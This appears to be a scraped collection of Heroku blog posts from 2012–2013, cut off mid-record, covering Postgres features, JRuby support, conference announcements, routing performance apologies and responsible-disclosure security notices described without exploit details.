{"website": "Heroku", "title": "Fork Your Application's Data (Not Just Your Code)", "author": ["Craig Kerstiens"], "link": "https://blog.heroku.com/fork_your_data", "abstract": "Fork Your Application's Data (Not Just Your Code) Posted by Craig Kerstiens November 08, 2012 Listen to this article Git and Github revolutionized software development by letting you fork your source repository with a single click. Wouldn't it be great to be able to do the same thing with your database? In the same way you can fork your code you can now fork your data. Fork changes the way you can work with your data, making it a snap to provision a clone of your production database. The technology is simple, safe, and robust, and thanks to Heroku Postgres' cloud architecture, places no load on your primary database. Today, we’re announcing the release of this functionality into General Availability. Forking your data opens up whole new ways of developing software. We've seen our users finding all kinds of use-cases including: Easier load testing Worry-free migrations Trivial cloning of data to development/staging How many times have you run a migration that went wrong in production but worked perfectly against your testing data? With Heroku Postgres, you can simply fork your production database and test the migration against real data. After it finishes, if the result looks good, you can promote it, fix it, or throw it away. If there's a problem, you still have your original database. This kind of fearless interaction is the product of a new way of thinking about data. By shifting the focus away from database servers and towards your data, Heroku Postgres gives you tools to work risk-free throughout the entire software lifecycle: in development, staging, and production. Creating forks is supported from both the CLI and through the Heroku Postgres dashboard. From within the Heroku Postgres dashboard, you can make a fork with one click: You can also use a single command with the Heroku CLI to fork your data: $ heroku addons:add heroku-postgresql:crane --fork HEROKU_POSTGRESQL_LAVENDER\nAdding heroku-postgresql:crane on sushi... done, v113 ($50/mo)\nAttached as HEROKU_POSTGRESQL_VIOLET_URL\n... Heroku Postgres features like fork empower you to focus on what really matters – building your application and business. By choosing Heroku Postgres as your database-as-a-service provider you get the benefit of constant improvement, and new functionality which gives you the ability to build better software faster and more safely. Fork is available immediately on every Heroku Postgres production database. To learn more about forking your data, you can read the dev center article , go to the Heroku Postgres dashboard and click the fork button on one of your existing databases, or simply create one from the command-line. As always with Heroku, you only pay for what you use, so give it a try today and see how easy it is and then let us know how you're using it at dod-feedback@heroku.com . postgres", "date": "2012-11-08,"},
{"website": "Heroku", "title": "Presenting the New Add-ons Site", "author": ["Zeke Sikelianos"], "link": "https://blog.heroku.com/new-addons-site", "abstract": "Presenting the New Add-ons Site Posted by Zeke Sikelianos December 04, 2012 Listen to this article Heroku Add-ons make it easy for developers to extend their applications with new features and functionality. The Add-on Provider Program has enabled cloud service providers with key business tools, including billing, single sign-on, and an integrated end-user support experience. Since the launch of the Heroku Add-ons site over two years ago, the marketplace has grown to nearly 100 add-ons. As the add-ons ecosystem has grown, we've learned a lot about how cloud service providers structure their businesses and how users interact with them. Today we're happy to announce the launch of the updated Heroku Add-ons site . The goal of the new site is to make it even easier to find, compare, purchase, and use add-ons. In addition to categorization, tagging, search, and an add-on showcase, we've made it easier to understand the benefits of each add-on, distinguish between plans, access documentation, and provision add-ons from the web or the command line. Here are some highlights of the new design: Showcase We're now featuring add-ons on the homepage in an active rotation based \non three criteria: newness, popularity, and staff picks. Categories We've introduced categories to help you make more informed decisions \nabout which add-ons are right for your use case, like which database to use. Search The home page now features a lightning-fast search field. Each search result includes the CLI command to install the add-on, so if you know the add-on you're looking for you can be on and off the site in a matter of seconds. The search tool also has some handy vim-inspired keyboard shortcuts: / focuses the search field. esc clears the search field. j (or down arrow) moves you down in the results. k (or up arrow) moves you up in the results. o (or enter) opens the currently selected search result. y selects the CLI command so you can copy it. Emphasis on Productivity In the new marketplace, we've encouraged add-on providers to highlight the ways in which their add-on will improve developers' lives. Rather than emphasizing technical commodities like megabytes of cache or number of allowed requests, benefits highlight the high-level value of each service, such as ease of integration, time saved, and higher productivity. Clear differentiation of Plans The new plan interface makes it easier to distinguish how an add-on's offerings change across plans. Dev Center Documentation We've added tighter integration with Dev Center for easy access to each add-on's documentation. Looking Forward As of today, the new Add-ons Marketplace is the default for everyone on the platform. \nWatch closely for updates and new features. To stay up to date as new add-ons enter the marketplace, check out the new add-ons changelog and subscribe to the \nfeed or follow our new twitter account, @HerokuAddons . Heroku is hiring addons provider partner", "date": "2012-12-04,"},
{"website": "Heroku", "title": "Postgres 9.2 – The Database You Helped Build", "author": ["Craig Kerstiens"], "link": "https://blog.heroku.com/postgres_92_now_available", "abstract": "Postgres 9.2 – The Database You Helped Build Posted by Craig Kerstiens December 06, 2012 Listen to this article Hosting your data on one of the largest fleets of databases in the world comes with certain advantages. One of those benefits is that we can aggregate the collective pain points that face our users and work within the Postgres community to help find solutions to them. In the previous year we worked very closely with the broader Postgres community to build features, fix bugs, and resolve pain points. You've already seen some of the results of that work in the form of extension support on Heroku and query cancellation . With the 9.2 release we're delighted to say that with your help, we've been able to bring you a whole host of new power and simplicity in your database. Effective immediately, we're moving Postgres 9.2 support into GA, which will become the new default shortly after. Postgres 9.2 is full of simplifications and new features that will make your life better, including expressive new datatypes, new tools for getting deep insights into your database's performance, and even some simple user interface improvements. Oh, and it's much, much faster for the most common kind of write performance pattern we see in our fleet. You can request a version 9.2 database from the command line like this: heroku addons:add heroku-postgresql:dev --version=9.2 Let's dig in a bit further with the new features this version brings. Visibility Visibility into your data has long been a problem for many application developers. Thanks to Peter Geoghegan , and the many involved in reviewing/testing, in the new version of Postgres all queries are normalized and data about them is recorded. This allows you to gain insight such as: How often a query is run How much time is spent running the query How much data is returned Each of these key pieces of data are critical when it comes to being able to effectively optimize your database's performance. The old way of drudging through logs is no longer needed to gain this insight. Now your database contains what it needs in order to help you improve performance within an un-forked Postgres database. Ensuring such functionality is committed back to the Postgres core is very important as it prevents lock-in and creates a better ecosystem for the community as a whole. Let's take a look at how we can begin using some of this. First turn on the tracking of pg_stat_statements with CREATE EXTENSION pg_stat_statements; Then run the query below and you'll receive all of your top run queries: SELECT \n    count(*),\n    query \nFROM\n  pg_stat_statements \nGROUP BY 2 \nORDER BY 1 DESC \nLIMIT 10; We're very excited about the visibility you can now gain into your database. We've begun exploring the powerful new ways we can show what's occurring with your database and look forward to seeing how we and our users can further expand the power of the improved visibility within Postgres 9.2. URLs All Postgres tools and libraries now support URLs natively. No more need for heroku pg:credentials -- just use the URL with any Postgres project tool. JSON Support Developers are always looking for more extensibility and power when working with and storing their data. Earlier this year we announced our support for hstore , a powerful key/value store within Postgres, which you can easily use within Rails , Django , and Java Spring . With Postgres 9.2 there's even more robust support for NoSQL within your SQL database, thanks to Andrew Dunstan , in the form of JSON . By using the JSON datatype your JSON is validated that it's proper JSON before it's allowed to be committed. Beyond the datatype itself there are several new functions available – record_to_json , row_to_json , and array_to_json . Using these functions we can turn a row immediately into JSON to be used within an application or returned via an API: $ heroku pg:psql\n=> SELECT row_to_json(row('foo','bar', 1, 2));\n     row_to_json     \n---------------------\n {\"f1\":\"foo\",\"f2\":\"bar\", \"f3\": 1, \"f4\": 2}\n(1 row) Range Type Support The range datatype , thanks to Jeff Davis , is another example of powerful data flexibility. The range datatype is a single column consisting of a to and from value. Your range can exist as a range of timestamps, alpha-numeric, or numeric range and can even have constraints placed on it to enforce common range conditions. For example, this schema ensures that in creating a class schedule we can't have two classes at the same time: CREATE TABLE schedule (class int, during tsrange);\nALTER TABLE schedule ADD EXCLUDE USING gist (during WITH &&); Then attempting to add data we would receive an error: INSERT INTO schedule VALUES (3, '[2012-09-24 13:00, 2012-09-24 13:50)');\nINSERT INTO schedule VALUES\n(1108, '[2012-09-24 13:30, 2012-09-24 14:00)');\nERROR:  conflicting key value violates exclusion constraint \"schedule_during_excl\" Performance Of course, any new release of a database wouldn't be complete without some focus on performance. Postgres 9.2, as expected, has delivered here in a big way including up to 4X improvements in speed on read queries and up to 20X improvements on data warehousing queries. In particular index-only scans can offer much faster queries because they no longer need to access disk to ensure correct results. Summary Heroku Postgres provides reliability and safety when working with your data. At Heroku Postgres, we were very excited to be able to fund core Postgres features for the first time and work with the community more closely to make Postgres an even better cloud database. The support of Postgres 9.2, now in general availability, makes power, flexibility and insight available to all Heroku Postgres users. Whether you’re looking to have NoSQL in your SQL database, better understand visibility, or receive a performance boost, this version should help you. Get started by provisioning one today from the Heroku CLI: heroku addons:add heroku-postgresql:dev --version=9.2 postgres", "date": "2012-12-06,"},
{"website": "Heroku", "title": "Run JRuby on Heroku Right Now", "author": ["Richard Schneeman"], "link": "https://blog.heroku.com/run_jruby_on_heroku_right_now", "abstract": "Run JRuby on Heroku Right Now Posted by Richard Schneeman December 13, 2012 Listen to this article Over a year ago Heroku launched the Cedar stack and the ability to run Java on our platform . Java is known as a powerful language - capable of performing at large scale. Much of this potential comes from the JVM that Java runs on. The JVM is the stable, optimized, cross-platform virtual machine that also powers other languages including Scala and Clojure. Starting today you can leverage the power of the JVM in your Ruby applications without learning a new language, by using JRuby on Heroku. After a beta process with several large production applications, we are pleased to move JRuby support into general availability immediately. One of these companies Travis CI which provides free CI testing to open source repositories , and a pro plan for private projects, was a JRuby beta tester. Josh Kalderimis of the Travis team had this to say about using JRuby on Heroku: We love JRuby, everything from the threading support to having the power of the JVM at our finger tips. But what we love\nmost is that we can set up a JRuby app in seconds, the same way as all of our other Heroku apps. Git push and it's live,\nno matter what the language. We've been working with the JRuby team to make sure that the experience using the language on Heroku is going to be everything you've come to expect from using our platform. So why should you be interested in running JRuby? Why JRuby If you're coming from a Java background and want to use a more dynamic language, JRuby allows you to leverage the syntax of Ruby with the the ability to run JVM based libraries. If you're a Ruby developer already on Heroku, the JRuby implementation has several unique features that you can leverage. The most prevalent difference between running code on JRuby and MRI, or cRuby, is JRuby's lack of a Global Virtual Machine Lock. This means you can run multiple threads of JRuby code within the same process. While cRuby does allow you to perform IO and other non-ruby commands in parallel threads, running Ruby code concurrently can only be done in multiple processes. The second difference is the JVM ecosystem. JRuby can use Java libraries such as JDBC based database drivers. Many of these libraries have been heavily optimized and can offer speed upgrades. JRuby on Heroku JRuby on Heroku lowers the barrier of entry to both learning and running a new language in production. The interface of JRuby with the Heroku platform is the same as our other languages: you push your code to us and we do the rest. You don't need to think about all of the details of running a new language. The result is you get to focus on adding features, not on your how to deploy and keep your systems up. We have been working with the JRuby community together to make sure the experience is a good one. Charles Nutter , the co-lead of JRuby, is excited about the future of running JRuby on Heroku: One of the most frequently-requested features for JRuby isn't a JRuby\nfeature at all...it's support for JRuby on Heroku. We're very excited\nthat Heroku now officially supports JRuby, and we're looking forward\nto working with and supporting Heroku users trying out JRuby on their\ncloud of choice. By normalizing the interface to deployment across implementations, we hope to ease the process of trying new interpreters within the Ruby community. We are excited to see a new class of applications, by running Ruby on the JVM, deployed and supported on Heroku. With all these options, which Ruby should you use in production? Which Ruby to Use? Heroku supports many languages, and we have a long and happy history of supporting Ruby. We are continuing to invest in the exciting future of MRI we are also excited about the ability for you to run your code on the interpreter of your choice. This can open up new possibilities such as taking advantage of different VM optimizations or concurrent Ruby processing. As you're trying JRuby, remember that it may behave slightly differently than you're used to with MRI. If you're interested in trying JRuby out on an existing Heroku app, you can read more about converting an existing Rails app to use JRuby . Every app is different and every project has different requirements. Having the ability to quickly and easily run your app in production on multiple Ruby VMs gives you the power to choose. Try it Today If you have an existing Rails app you can deploy your existing app on JRuby . If you're just starting from scratch, running JRuby on Heroku is a breeze. All you need to do is specify the version of Ruby you want to run, the engine, and the engine version in your Gemfile : ruby '1.9.3', engine: 'jruby', engine_version: '1.7.1' You'll need to run bundle install with JRuby locally, then commit the results and push to Heroku: $ git add .\n$ git commit -m \"trying JRuby on Heroku\"\n$ git push heroku master\nCounting objects: 692, done.\nDelta compression using up to 4 threads.\nCompressing objects: 100% (662/662), done.\nWriting objects: 100% (692/692), 141.01 KiB, done.\nTotal 692 (delta 379), reused 0 (delta 0)\n\n-----> Heroku receiving push\n-----> Ruby/Rails app detected\n-----> Using Ruby version: ruby-1.9.3-jruby-1.7.1\n-----> Installing JVM: openjdk7-latest\n-----> Installing dependencies using Bundler version 1.2.1\n# ... That should be all you need to do to run JRuby on Heroku. If you're converting an existing Rails application, please read moving an existing Rails app to run on JRuby . While you're trying JRuby out on Heroku you can also try out Ruby 2.0.0 preview, before it is released in February. Conclusion With the release of JRuby on Heroku now you can to run your code on multiple VMs, and leverage concurrent Ruby code in production. You've got a standard interface to deployments and the power to choose the right tool for the right job. Special thanks to all of the customers who tried the JRuby beta, and to the JRuby team for being available for technical support. Give JRuby a try and let us know what you think. jruby ruby implementation jvm vm virtual machine mri", "date": "2012-12-13,"},
{"website": "Heroku", "title": "Password Hijacking Security Vulnerability and Response", "author": ["Oren Teich"], "link": "https://blog.heroku.com/password_hijacking_security_incident_and_response", "abstract": "Password Hijacking Security Vulnerability and Response Posted by Oren Teich January 09, 2013 Listen to this article Heroku recently learned of and resolved a security vulnerability. We want to report this to you, describe how we responded to the incident, and reiterate our commitment to constantly improving the security and integrity of your data and source code. On December 19, 2012, security researcher Stephen Sclafani notified us of an issue in our account creation system. Using a maliciously-crafted HTTP request, an attacker could change the password of a pre-existing Heroku user account, and thus gain control of it. This attack would not disclose the pre-existing password to the attacker (those are stored internally as non-recoverable bcrypt hashes). Upon receiving notification, our engineering and security staff engaged with Mr. Sclafani.  We developed and deployed a preliminary patch to production on December 20. While we were deploying the patch, Mr. Sclafani also discovered a related issue in the password reset flow that could be used to reset the passwords of a certain subset of users at random. A preliminary patch for this was also developed and deployed on December 20. After deploying these patches, we conducted a thorough and comprehensive audit of our internal logs.  We found no evidence that these vulnerabilities were exploited prior to Mr. Sclafani’s research on December 19, either by him or any other third parties. Due to the nature of the vulnerability, any customer whose account was compromised would have found both their existing password and API key invalidated, and would have had to initiate a password reset. While both Mr. Sclafani and Heroku endeavoured to use test accounts exclusively, a very small number of customer account passwords were reset during the incident. We have contacted the impacted customers and advised them to reset their passwords and credentials. We would like to thank Mr. Sclafani for notifying us of this vulnerability, and giving us ample opportunity to fix it.  His description is available at http://stephensclafani.com/2013/01/09/vulnerabilities-in-heroku/ . We are extremely grateful to both him and all external security researchers who practice responsible disclosure. We are confident in the steps we have taken to protect our customers from this vulnerability and will continue to improve our internal processes in order to provide our customers with a trusted cloud platform. We would also like to reaffirm our commitment to the security and integrity of our customers’ data and code. Nothing is more important to us. Oren Teich, Chief Operating Officer security", "date": "2013-01-09,"},
{"website": "Heroku", "title": "Rails Security Vulnerability", "author": ["Mark McGranaghan"], "link": "https://blog.heroku.com/rails_security_vulnerability", "abstract": "Rails Security Vulnerability Posted by Mark McGranaghan January 10, 2013 Listen to this article A serious security vulnerability has been found in the Ruby on Rails framework. This exploit affects nearly all applications running Rails and a patch has been made available. Rails developers can get a full list of all your affected Heroku applications by following instructions here . Please address this security vulnerability by immediately upgrading your affected apps to any of the safe versions of Rails listed below. The following Rails versions have been patched and deemed safe from this exploit: 3.2.11 3.1.10 3.0.19 2.3.15 If you do not upgrade, an attacker can trivially gain access to your application, its data, and run arbitrary code or commands. Heroku recommends upgrading to a patched version immediately. How to Upgrade: Open the Gemfile in the affected application and change the Rails version to one listed above: rails '3.2.11' Then run: $ bundle update rails Then commit the results to git, and push to Heroku: $ git commit -am \"Bundle update rails\"\n$ git push heroku master Repeat for any susceptible applications. If you cannot upgrade at this time, please consider enabling maintenance mode or scaling your app down to zero dynos. $ heroku maintenance:on -a APPNAME\n$ heroku scale web=0 -a APPNAME Any applications running an insecure version are at risk. rails security", "date": "2013-01-10,"},
{"website": "Heroku", "title": "Registration for Waza 2013 is now open", "author": ["Sara Dornsife"], "link": "https://blog.heroku.com/registration_for_waza_2013_is_now_open", "abstract": "Registration for Waza 2013 is now open Posted by Sara Dornsife January 11, 2013 Listen to this article The Concourse - San Francisco\nFebruary 28, 2013 Heroku’s Waza (技) , the Japanese word for art and technique, is an immersive one-day developer experience focused on craft. Throughout the event you will find technical sessions with added experiences in music, art and technology. The event features technical sessions, hands-on workshops, great food, and traditional music. Registration is now open! Tickets are $300. Last year’s event sold out in a matter of hours. Don’t risk missing out this year -- join us for Waza on February 28th, 2013 at the Concourse in San Francisco. We are excited to announce the following speakers: Aaron Patterson Austin Bales Jack Lawson Jacob Kaplan-Moss Jason Scott Joseph Ruscio Kirby Ferguson Kyle Conroy Linda Liukas Mattt Thompson Matz Michael Lopp Noah Zoschke Oren Teich Peter Van Hardenberg Rune Madsen Ryan Smith Sharon Schmidt Steve Klabnik Wesley Beary", "date": "2013-01-11,"},
{"website": "Heroku", "title": "Cross-Site Request Forgery Vulnerability Resolution", "author": ["Oren Teich"], "link": "https://blog.heroku.com/cross_site_request_forgery_vulnerability_resolution", "abstract": "Cross-Site Request Forgery Vulnerability Resolution Posted by Oren Teich January 25, 2013 Listen to this article On Friday January 18, security researcher Benjamin Manns notified Heroku of a security vulnerability related to our add-ons program.  At a high level, the vulnerability could have resulted in disclosing our Cross-Site Request Forgery tokens (these tokens are used to prevent browser hijacking) to third parties. We quickly addressed the vulnerability and on Sunday, we deployed a patch to remediate the issue. We also reviewed our code for related vulnerabilities and conducted a review of our audit logs to determine the impact of the vulnerability. We found no instances of this issue being exploited. We wish to thank Mr. Manns for his work and commitment to responsible disclosure.  You can access his write up here: http://www.benmanns.com/posts/security-vulnerability-found-in-heroku-and-rails-form-tag/ We would also like to reaffirm our commitment to the security and integrity of our customers’ data and code. Nothing is more important to us. Oren Teich, Chief Operating Officer security", "date": "2013-01-25,"},
{"website": "Heroku", "title": "Learn from your Data with Dataclips 2.0", "author": ["Craig Kerstiens"], "link": "https://blog.heroku.com/learn_from_your_data_with_dataclips_20", "abstract": "Learn from your Data with Dataclips 2.0 Posted by Craig Kerstiens January 17, 2013 Listen to this article An organization's data is its most valuable asset. Unfortunately, that data is usually trapped inside a database with few ways to access it by a privileged handful of people. Too often reports are manually generated and their results pasted into emails; dashboards get built but rapidly become outdated and never answer the right questions. We have so many great tools for collaborating around our source code, why is data still in the dark ages?\nAt Heroku Postgres, we believe that your data should flow like water. Only the most up-to-date data should be available any time you have a decision to make. Instead of being trapped in disparate systems, you should be able to move data smoothly between development, staging, and production. It should flow across apps, between teams, and between services. That's why we built Dataclips , a tool for sharing live query results . Think of it as pastebin for SQL, or gist for your data. Each dataclip is a sharable handle to a live query and is available in a variety of formats. You can email them, tweak them, fork them, embed them in spreadsheets. We use it for everything at Heroku; from building dashboards to prototyping APIs. We've seen customers using dataclips to track down abuse in their systems, simply monitor the progress of a new launch by tracking user sign ups, or to regularly track key business metrics (like above). In the past, dataclips was just a part of your postgres.heroku.com dashboard. Today, based on the customer feedback we collected over the past year, we've built a whole new dataclips designed to make it more useful to you, our users. Furthermore, with our recent new plans it's now available to all Heroku Postgres users. Let's dig into some of the exciting new features available today in this release: Fork and Modify your Dataclips A few months ago we announced the ability to fork your database, enabling you to work with your data in new ways. Now you can do the same with a dataclip. Forking creates a new dataclip with a new URL that you can then modify to your heart's content. Your original dataclip still exists and will continue to be available at its original URL. We've also added better support for updating dataclips. Now when you modify the query a dataclip runs, it will maintain its URL. Any changes you make to a dataclip will appear to those who access the clip and changes are clearly visible under the revisions area. Find and Discover Dataclips With the growing use of dataclips, it becomes increasingly important to be able to navigate and search them the way you prefer. Dataclips' new dashboard allows you to easily search your clips by author, database, or name. As you create more and more Dataclips, you'll find navigating them much simpler with recent updates. Granular Dataclip Access Control With all of this important data easily sharable you may be wondering how you take advantage of your data while still keeping it secure. Dataclips have always been secured through un-guessable unique URLs, now there is the additional option to secure your dataclips to specific Heroku accounts. Now you can securely grant or remove access to data without requiring you to recreate dataclips when individuals no longer need access to the data. With the new security, when you invite a new user to a dataclip they'll receive a notice its been shared with them. If your user doesn't have a Heroku account they'll have the opportunity to create one and then access the data. Integrate and Share your Results Embedding dataclips directly into spreadsheets is a feature our users love -- and they do a lot of it. We do it all the time here at Heroku and routinely build simple dashboards this way. In this new release we’ve made this much more convenient. Now with the click of a button you can import your live dataclip to Google Docs and have it kept in sync. Using this functionality you can now easily build full dashboards that allow you to report against your business . Summary Dataclips are a powerful tool to build dashboards, quickly protoype APIs, or simply explore your data. You can read more about using dataclips within our Dev Center or start using them here today . postgres", "date": "2013-01-17,"},
{"website": "Heroku", "title": "Waza 2013 - Keynote Speakers", "author": ["Sara Dornsife"], "link": "https://blog.heroku.com/waza_2013_keynote_speakers", "abstract": "Waza 2013 - Keynote Speakers Posted by Sara Dornsife January 29, 2013 Listen to this article Waza (技) 2013 is less than a month away and we are excited to have a full lineup of speakers who will be talking about their perspectives on art and technique. In between the talks, take part in an unique blend of conversation and craft through the hands-on workshops led by artisans teaching their trades from origami creations, to take-home woodblock prints, and even a hand-crafted and dyed quilt. Take part in this celebration of skill and making at Waza 2013 . Waza Keynotes: Michael Lopp: Rands in Repose Michael has been blogging since 2002 as his alter-ego Rands in Repose . Our favorite recent quote: \"Engineers don’t hate process. They hate process that can’t defend itself.\" We couldn’t agree more. Kirby Ferguson: Everything is a Remix. Kirby is a filmmaker, storyteller, and remixer. He is known for his fantastic video series Everything is a Remix Favorite quote: “We are not self-made. We are dependent on one another. Admitting this to ourselves isn't an embrace of mediocrity and derivativeness, it's a liberation from our misconceptions.” He’s been featured at TED . Speaker Lineup: In addition to these fantastic keynotes, we have a full day of sessions that include: Aaron Patterson : Rails and Ruby core contributor Rune Madsen : a computational artist working in the fields of programming and graphic design Steve Klabnik : The nomads are there, wherever there forms a smooth space ... The nomads inhabit these places; they remain in them, and they themselves make them grow. Jason Scott : Proprietor of TEXTFILES.COM , historian, filmmaker, archivist, famous cat ( @sockington ) maintenance staff Jacob Kaplan-Moss : Creator of Django Yukihiro 'Matz' Matsumoto : Rubyのパパ (Ruby’s Dad) Sharon Schmidt : When life hands me lemons I throw them on the floor. Jack Lawson : Engineer @airbnb. Husband, father & purveyor of fine javascripts. Austin Bales :  Designing Do (@DoWorkTogether). ENTP. CMU alum. Friend of @odopod. Ryan Smith : ♠ ace hacker. heroku engineer. Linda Liukas : Community manager at Codecademy.com . Co-founder of Rails Girls . Rob Sullivan :  Señor Enterprise Data Magistrate. In my free time I crash servers, eat burritos and run a street gang called Los Locos. Kyle Conroy : Software engineer and REST API enthusiast. The @Twilio king of interns. Makerbot wrangler. Disc thrower. Noah Zoschke : SF explorer. Heroku hacker. Mattt Thompson : Mobile lead at @Heroku . Creator of @AFNetworking , @PostgresApp , & @NSHipster . Hacker from the Rustbelt, living in SF. Joseph Ruscio : Live in SF, hacker/cto @librato , marathoner, snowboarder, home-brewer. Peter van Hardenberg : One of the herokai working mostly on Postgres. He’s just this guy, you know? Wesley Beary : gamer, hacker, herokai, mentor, open sourced, quantified, self Afterparty, sponsored by GitHub Waza doesn’t end after the last speaker leaves the stage. All attendees are invited to join Heroku and Github at the Waza afterparty. Live music, drinks, and a great time is on the schedule. Don’t miss out - Register Today !", "date": "2013-01-29,"},
{"website": "Heroku", "title": "Bamboo Routing Performance", "author": ["Oren Teich"], "link": "https://blog.heroku.com/bamboo_routing_performance", "abstract": "Bamboo Routing Performance Posted by Oren Teich February 14, 2013 Listen to this article Yesterday, one of our customers let us know about significant performance issues they have experienced on Heroku. They raised an important issue and I want to let our community know about it. In short, Ruby on Rails apps running on Bamboo have experienced a degradation in performance over the past 3 years as we have scaled. We failed to explain how our product works. We failed to help our customers scale. We failed our community at large. I want to personally apologize, and commit to resolving this issue. Our goal is to make Heroku the best platform for all developers. In this case, we did not succeed. But we will make it right. Here’s what we are working on now: Posting an in-depth technical review tomorrow Quickly providing more visibility into your app’s queue of web requests Improving our documentation and website to accurately reflect our product Giving you tools to understand and improve the performance of your apps Working closely with our customers to develop long-term solutions I am committing to listening to you, acting quickly to meet your needs and making sure Heroku is a platform that you trust for all of your applications. If you have additional concerns, please let me know. My email address is oren.teich@heroku.com . Oren Teich\nGM, Heroku", "date": "2013-02-14,"},
{"website": "Heroku", "title": "Routing Performance Update", "author": ["Jesper Joergensen"], "link": "https://blog.heroku.com/routing_performance_update", "abstract": "Routing Performance Update Posted by Jesper Joergensen February 15, 2013 Listen to this article Over the past couple of years Heroku customers have occasionally reported unexplained latency on Heroku. There are many causes of latency—some of them have nothing to do with Heroku—but until this week, we failed to see a common thread among these reports. We now know that our routing and load balancing mechanism on the Bamboo and Cedar stacks created latency issues for our Rails customers, which manifested themselves in several ways, including: Unexplainable, high latencies for some requests Mismatch between reported queuing and service time metrics and the observed reality Discrepancies between documented and observed behaviors For applications running on the Bamboo stack, the root cause of these issues is the nature of routing on the Bamboo stack coupled with gradual, horizontal expansion of the routing cluster. On the Cedar stack, the root cause is the fact that  Cedar is optimized for concurrent request routing, while some frameworks, like Rails, are not concurrent in their default configurations. We want Heroku to be the best place to build, deploy and scale web and mobile applications. In this case, we’ve fallen short of that promise. We failed to: Properly document how routing works on the Bamboo stack Understand the service degradation being experienced by our customers and take corrective action Identify and correct confusing metrics reported from the routing layer and displayed by third party tools Clearly communicate the product strategy for our routing service Provide customers with an upgrade path from non-concurrent apps on Bamboo to concurrent Rails apps on Cedar Deliver on the Heroku promise of letting you focus on developing apps while we worry about the infrastructure We are immediately taking the following actions: Improving our documentation so that it accurately reflects how our service works across both Bamboo and Cedar stacks Removing incorrect and confusing metrics reported by Heroku or partner services like New Relic Adding metrics that let customers determine queuing impact on application response times Providing additional tools that developers can use to augment our latency and queuing metrics Working to better support concurrent-request Rails apps on Cedar The remainder of this blog post explains the technical details and history of our routing infrastructure, the intent behind the decisions we made along the way, the mistakes we made and what we think is the path forward. How routing works on the Bamboo stack In 2009, Heroku introduced the Bamboo stack. It supported only one language, one web framework and one embedded webserver. These were: Ruby (MRI 1.8), Rails (2.x) and Thin, respectively. The Bamboo stack does not support concurrency. On Bamboo, a single process can serve only one request at a time. To support this architecture, Heroku’s HTTP router was designed to queue requests at the router level. This enabled it to efficiently distribute requests to all available dynos. The Bamboo router never used a global per-application request queue. The router is a clustered service where each node in the cluster maintains its own per-application request queue. This is less efficient than routing with a global request queue, but it is a reasonable compromise as long as the cluster is small. To see why, let’s look at a simplistic example. In the two diagrams below, requests are coming in through three router nodes and being passed to two dynos. The majority of requests take 50ms, while a rare slow request takes 5000ms. In the first diagram, you can see how a slow request, coming in to Router 1, is passed to Dyno 1. Until Dyno 1 is finished with that request, Router 1 will not send any more requests to that dyno. However, Routers 2 and 3 may still send requests to that dyno. Meanwhile, as illustrated in the next diagram, because Routers 2 and 3 are not aware that Dyno 1 is busy, they may still queue up one request each for Dyno 1. These requests are delayed until Dyno 1 finishes processing the slow request. The inefficiency in request routing gets worse as the number of routers increases. This is essentially what’s been happening with Rails apps running on the Bamboo stack. Our routing cluster remained small for most of Bamboo’s history, which masked this inefficiency. However, as the platform grew, it was only a matter of time before we had to scale out and address the associated challenges. Routing on Cedar As part of the new Cedar stack, we chose to evolve our router design to achieve the following: Support additional HTTP features like long polling and chunked responses Support multi-threaded and multi-process runtimes like JVM, Node.js, Unicorn and Puma Stateless architecture to optimize for reliability and scalability Additionally, to meet the scalability requirements of Cedar we chose to remove the queuing logic and switch to random assignment. This new routing design was released exclusively on Cedar and was significantly different from the old design. What’s important to note is we intended customers to get the new routing behavior only when they deployed applications to Cedar. Degradation of Bamboo routing In theory, customers who had relied on the behavior of Bamboo routing could continue to use the Bamboo stack until they were ready to migrate to Cedar. Unfortunately that is not what happened. As traffic on Heroku grew, we added new nodes to the routing cluster rendering the per-node request queues less and less efficient, until Bamboo was effectively performing random load balancing. We did not document this evolution for our customers nor update our reporting to match the changing behavior. As a result, customers were presented with confusing metrics. Specifically, our router logs captured the service time and the depth of the per app request queue and present that to customers, who in turn were relying on these metrics to determine scaling needs. However, as the cluster grew, the time-and-depth metric for an individual router was no longer a relevant way to determine latency in your app. As a result, customers experienced what was effectively random load balancing applied to their Bamboo applications. This was not caused by an explicit change to the Bamboo routing code. Nor was it related to the new routing logic on Cedar. It was a pure side-effect of the expansion of the routing cluster. No path for concurrent Rails apps on Cedar We launched Cedar in beta in May 2011 with support for Node.js and Ruby on Rails. Our documentation recommends the use of Thin, which is a single-threaded, evented web server. In theory, an evented server like Thin can process multiple concurrent requests, but doing this successfully depends on the code you write and the libraries you use. Rails, in fact, does not yet reliably support concurrent request handling. This leaves Rails developers unable to leverage the additional concurrency capabilities offered by the Cedar stack, unless they move to a concurrent web server like Puma or Unicorn. Rails apps deployed to Cedar with Thin can rather quickly end up with request queuing problems. Because the Cedar router no longer does any queuing on behalf of the app, requests queued at the dyno must wait until the single Rails process works its way through the queue. Many customers have run into this issue and we failed to take action and provide them with a better approach to deploying Rails apps on Cedar. Next Steps To reiterate, here is what we are doing now: Improving our documentation so that it accurately reflects how our service works across both Bamboo and Cedar stacks Removing incorrect and confusing metrics reported by Heroku or partner services like New Relic Adding metrics that let customers determine queuing impact on application response times Providing additional tools that developers can use to augment our latency and queuing metrics Working to better support concurrent-request Rails apps on Cedar If you have thoughts or questions, please comment below or reach out to me directly at jesperj@heroku.com .", "date": "2013-02-15,"},
{"website": "Heroku", "title": "What’s Happening at Waza  ", "author": ["Sara Dornsife"], "link": "https://blog.heroku.com/waza-2013-happening", "abstract": "What’s Happening at Waza Posted by Sara Dornsife February 20, 2013 Listen to this article Waza (技) 2013 is only a week away and the schedule is packed with amazing speakers and hands-on craft experiences. We can’t wait to share this day with all of you. If you haven’t yet, register now before it’s too late! This year, Waza will have three stages with a total of 20 talks. The rest of the venue is packed with lounges, co-working spaces, snack and beverage stations, and, thanks to our sponsors, all kinds of interactive, craft-based activities to fuel your creative mind. ##Hands-on Crafts In addition to our great sponsored happenings, we have quilting, dye-making and printmaking artists on hand. Come experience their unique crafts, hands-on and up-close. Quilting and Dye-making : Maura Grace Ambrose is bringing her Folk Fibers all the way from Austin, TX. Maura collects natural materials to dye fabrics then uses them to stitch together special quilts. Join Maura in the hands-on creation of a custom Waza quilt. Printmaking : Marissa Marquez joins us at Waza for the second time. Marissa uses woodworking tools to hand-carve original designs into blocks and stamp them onto paper. She has created some beautiful prints for Waza which you can use to print your own postcard, or she can teach you how to make your own. ##All Things Delicious Blue Bottle Coffee : We’re a bit obsessed with coffee at Heroku. And it’s an obsession we like to share. Doors open at 10am for badge pickup, show up early and enjoy a cup of 